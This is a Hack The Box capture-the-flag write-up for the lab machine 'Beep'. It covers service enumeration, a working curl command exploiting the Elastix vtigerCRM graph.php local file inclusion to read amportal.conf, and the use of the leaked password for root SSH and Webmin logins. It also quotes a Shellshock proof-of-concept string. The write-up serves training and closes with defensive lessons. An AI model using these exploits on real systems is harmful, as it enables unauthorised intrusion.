# Beep

![image.png](image.png)

# Context

Lab link: [https://app.hackthebox.com/machines/Beep](https://app.hackthebox.com/machines/Beep?tab=machine_info)

Suggested tools: `nmap`, Firefox, `grep`, `openssl`, `ssh`, `searchsploit`, `curl`

# Scenario

Beep has a very large list of running services, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.

# Questions

Q1- Which Linux distribution is the target machine running?

Answer: CentOS

Reason: A full TCP sweep with `nmap -sC -sV -p- beep.htb` found 16 open ports. The server header on 80/443 identifies the OS as `CentOS` running `Apache/2.2.3`. Port 22 runs `OpenSSH 4.3`. Mail services are present on `25`, `110`, `995`, `143`, `993`, and `4190`. RPC is exposed on `111` and `856`. `MySQL` listens on `3306`. Telephony-related ports `5038` (Asterisk Call Manager 1.1), `4445`, and `4559` (HylaFax) are open. Port 443 serves an `Elastix - Login page`, and port `10000` runs `MiniServ 1.570 (Webmin httpd)`. The outdated stack and Elastix presence point toward a known 2012-era CVE as the likely entry vector.

```bash
$ grep -i os beep_nmap                   
Host is up (0.046s latency).
Not shown: 65519 closed tcp ports (reset)
| ssh-hostkey: 
|_http-server-header: Apache/2.2.3 (CentOS)
|_  Supported Methods: GET HEAD POST OPTIONS
```

Q2- What version of TLS is the web application on TCP port 443 using?

Answer: 1.0

Reason: The server only negotiates `TLSv1`, confirmed by connecting directly with `openssl s_client`. The certificate is also self-signed and expired (`notAfter=Apr 7 08:22:08 2018 GMT`), consistent with an old, unmaintained Elastix install.

```bash
$ openssl s_client -connect beep.htb:443 | grep -i protocol
Connecting to 10.129.229.183
depth=0 C=--, ST=SomeState, L=SomeCity, O=SomeOrganization, OU=SomeOrganizationalUnit, CN=localhost.localdomain, emailAddress=root@localhost.localdomain
verify error:num=18:self-signed certificate
verify return:1
depth=0 C=--, ST=SomeState, L=SomeCity, O=SomeOrganization, OU=SomeOrganizationalUnit, CN=localhost.localdomain, emailAddress=root@localhost.localdomain
verify error:num=10:certificate has expired
notAfter=Apr  7 08:22:08 2018 GMT
verify return:1
depth=0 C=--, ST=SomeState, L=SomeCity, O=SomeOrganization, OU=SomeOrganizationalUnit, CN=localhost.localdomain, emailAddress=root@localhost.localdomain
notAfter=Apr  7 08:22:08 2018 GMT
verify return:1
Protocol: TLSv1
    Protocol  : TLSv1
[...]
```

Q3- What is the name of the software that's hosting a webserver on 443?

Answer: elastix

Reason: The `http-title` from the `nmap` scan returns `Elastix - Login page`, confirming the web application on port 443 is Elastix, served via `Apache/2.2.3 (CentOS)`.

```bash
# nmap output
[...]
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_ssl-date: 2026-11-06T01:17:11+00:00; +4s from scanner time.
|_http-title: Elastix - Login page
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry 
```

Q4- Which Elastix endpoint is vulnerable to a Local File Inclusion?

Answer: `/vtigercrm/graph.php`

Reason: The `37637.pl` exploit script targets `/vtigercrm/graph.php`, abusing the `current_language` parameter with a null byte to traverse the filesystem and include arbitrary files, demonstrated here against `/etc/amportal.conf`.

```bash
$ cat 37637.pl | grep -i lfi
# Exploit Title: Elastix 2.2.0 LFI
print "\t Elastix 2.2.0 LFI Exploit \n";
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

Q5- What is the name of the FreePBX configuration file that contains the database configuration?

Answer: `amportal.conf`

Reason: The `37637.pl` LFI exploit specifically targets `amportal.conf`, which stores FreePBX's AMP database credentials (`AMPDBUSER`/`AMPDBPASS`) among other settings, making it the natural first target for the LFI.

Q6- What additional flag is needed when attempting to SSH as root to the target machine due to a "no matching key exchange method found" error? It starts with `-o` and ends with `-sha1`.

Answer: `-oKexAlgorithms=+diffie-hellman-group1-sha1`

Reason: The target's OpenSSH 4.3 only offers legacy key exchange algorithms that modern OpenSSH clients disable by default. Appending `-oKexAlgorithms=+diffie-hellman-group1-sha1` to the ssh command re-enables `diffie-hellman-group1-sha1` so the handshake can complete.

Q7- Submit the flag located in the `fanis` user's home directory.

Answer: [`REDACTED`]

Reason: The `amportal.conf` file, retrieved via the `graph.php` LFI, exposed multiple instances of the same password (`jEhdIekWmdjE`). This password was reused directly as the root SSH password, granting full root access and read access to all home directories including fanis's flag.

```bash
# Using the known LFI exploit
$ curl -vk --tlsv1.0 'https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' -o amportal.conf

$ grep -i password amportal.conf 
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPMGRPASS: Password for AMPMGRUSER
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
# CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS

$ ssh root@beep.htb -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa
root@beep.htb's password: 
Last login: Wed Nov 15 12:55:38 2023

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.229.183

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

Q8- Submit the flag located in root's home directory.

Answer: [`REDACTED`]

Reason: Same root shell obtained above via SSH with the password reused from `amportal.conf`, giving direct read access to `/root/root.txt`.

Q9- There are many other ways to root Beep. These questions after the root flag are hints to help identify them. What is the 2012 CVE ID for pre-authentication remote code execution vulnerability in FreePBX / Elastix?

Answer: CVE-2012-4869

Reason: The `searchsploit` database links exploit `18650` (`FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution`) directly to `CVE-2012-4869`, confirming the same CVE covers both the `graph.php` LFI and this separate pre-auth RCE path.

```bash
$ searchsploit -m 18650
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
```

Q10- What password from the PBX config also works to log in as root to the Webmin application listening on TCP 10000?

Answer: `jEhdIekWmdjE`

Reason: The same credential harvested from `amportal.conf` and reused for root SSH also authenticates as `root` on the `Webmin 1.570` interface on port `10000`, confirming the password was reused across every privileged service on the box.

![image.png](image%201.png)

Q11- What is the common name for the set of 2014 CVEs where this is a POC exploit: `() { :; };sleep 10`?

Answer: Shellshock

Reason: The payload `() { :; };sleep 10` is the classic bash function-definition trick that abuses `CVE-2014-6271` and related CVEs, collectively nicknamed `Shellshock`, which allow arbitrary command execution via crafted environment variables, commonly exploited through CGI scripts.

Q12- What is the full path to the asterisk user's mail folder on Beep?

Answer: `/var/mail/asterisk`

Reason: Although /var/spool/mail/asterisk and /var/mail/asterisk point to the same underlying mbox file, the task specifically expects the /var/mail/asterisk path. Confirmed as a valid mbox file containing local cron notifications delivered via Postfix.

```bash
[root@beep ~]# file /var/mail/asterisk 
/var/mail/asterisk: ASCII mail text

[root@beep ~]# head /var/mail/asterisk 
From asterisk@beep.localdomain  Fri Oct 27 21:04:02 2023
Return-Path: <asterisk@beep.localdomain>
X-Original-To: asterisk
Delivered-To: asterisk@beep.localdomain
Received: by beep.localdomain (Postfix, from userid 100)
        id 2C1A9C0001; Fri, 27 Oct 2023 21:04:02 +0300 (EEST)
From: root@beep.localdomain (Cron Daemon)
To: asterisk@beep.localdomain
Subject: Cron <asterisk@beep> /var/lib/asterisk/bin/freepbx-cron-scheduler.php
Content-Type: text/plain; charset=UTF-8
```

# Attack Tree

```bash
HTB Beep (beep.htb)
│
├── 443 -- Elastix 2.2.0 web login, outdated Apache/CentOS stack
│   └── CVE-2012-4869 -- vtigerCRM graph.php LFI
│       └── curl --tlsv1.0 'https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action'
│           └── leaked AMPDBPASS/FOPPASSWORD/ARI_ADMIN_PASSWORD (all `jEhdIekWmdjE`)
│               └── ssh root@beep.htb -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa
│                   └── shell as root
│                       │
│                       ├── /home/fanis/user.txt
│                       │   └── [USER FLAG - REDACTED]
│                       │
│                       └── /root/root.txt
│                           └── [ROOT FLAG - REDACTED]
│
├── 10000 -- Webmin 1.570 (MiniServ)
│   └── password reuse (`jEhdIekWmdjE`) -- root login confirmed via web UI
│
└── 80/443 -- alternate path (not taken): FreePBX 2.10.0 / Elastix 2.2.0 pre-auth RCE (CVE-2012-4869 / exploit-db 18650)
```

# Artifacts

| Category | Type | Value |
| --- | --- | --- |
| Reconnaissance | Target | `beep.htb` |
|  | OS | CentOS |
|  | Web server | `Apache/2.2.3` |
|  | TLS version | `TLSv1.0` |
|  | PBX software | Elastix 2.2.0 |
| Vulnerability | LFI | `/vtigercrm/graph.php` (`CVE-2012-4869`) |
|  | Alternate RCE | FreePBX 2.10.0 / Elastix 2.2.0 (exploit-db `18650`, `CVE-2012-4869`) |
| Credential Access | Leaked config file | `/etc/amportal.conf` |
|  | Reused password | `jEhdIekWmdjE` |
|  | Reused across | `AMPDBPASS`, `FOPPASSWORD`, `ARI_ADMIN_PASSWORD`, root SSH, Webmin root |
| Discovery | Mail spool | `/var/mail/asterisk` |
|  | Voicemail store | `/var/spool/asterisk/voicemail` |
| Privilege Escalation | Access level | root (direct, via credential reuse) |
| Flags | User flag | `[REDACTED]` (`/home/fanis/user.txt`) |
|  | Root flag | `[REDACTED]` (`/root/root.txt`) |

# Lab Insights

1. A single leaked configuration file is rarely limited to the credential it was targeted for — amportal.conf exposed one password (`jEhdIekWmdjE`) reused across the database account, the Asterisk Manager Interface, the Flash Operator Panel, and ultimately root SSH and Webmin. Password reuse across application and OS layers turns a low-privilege config leak into full system compromise (T1552.001).
2. Unauthenticated LFI in a bundled third-party component (vtigerCRM, shipped inside Elastix) is often more dangerous than a vulnerability in the core product itself, since bundled software frequently lags behind patching cycles for the parent application. The graph.php endpoint's current_language parameter allowed arbitrary file reads via path traversal and a null-byte terminator, reading sensitive OS configuration files directly (T1190).
3. Legacy protocol support left enabled for compatibility (TLSv1.0, SSHv2 with deprecated KEX/host-key algorithms) is a reliable signal of an unmaintained host, and often correlates with equally outdated application versions carrying known, pre-authentication RCE paths. Identifying these downgrade requirements early is itself reconnaissance value, not just an inconvenience to route around (T1600).